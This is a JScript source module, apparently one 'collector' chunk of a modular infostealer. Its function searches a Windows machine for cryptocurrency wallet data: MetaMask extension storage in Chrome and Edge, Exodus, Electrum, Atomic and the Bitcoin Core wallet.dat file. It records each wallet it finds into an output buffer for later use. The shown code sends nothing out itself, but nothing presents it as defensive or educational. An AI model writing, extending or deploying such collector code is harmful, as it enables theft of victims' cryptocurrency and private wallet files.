// chunk: collectors/crypto_wallets
// depends: core/emit_buffer, core/file_ops
// provides: collect_crypto_wallets
// format: jscript

function collect_crypto_wallets() {
    emit("\r\n=== CRYPTO WALLETS ===\r\n");
    var local = _s.ExpandEnvironmentStrings("%LOCALAPPDATA%");
    var appdata = _s.ExpandEnvironmentStrings("%APPDATA%");
    var wallets = [
        {name: "MetaMask (Chrome)", path: local + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
        {name: "MetaMask (Edge)", path: local + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"},
        {name: "Exodus", path: appdata + "\\Exodus\\exodus.wallet"},
        {name: "Electrum", path: appdata + "\\Electrum\\wallets"},
        {name: "Atomic", path: appdata + "\\atomic\\Local Storage"},
        {name: "Bitcoin Core", path: appdata + "\\Bitcoin\\wallet.dat"}
    ];
    for (var i = 0; i < wallets.length; i++) {
        if (_fso.FolderExists(wallets[i].path) || file_exists(wallets[i].path)) {
            emit("  " + wallets[i].name + ": FOUND at " + wallets[i].path + "\r\n");
        }
    }
}
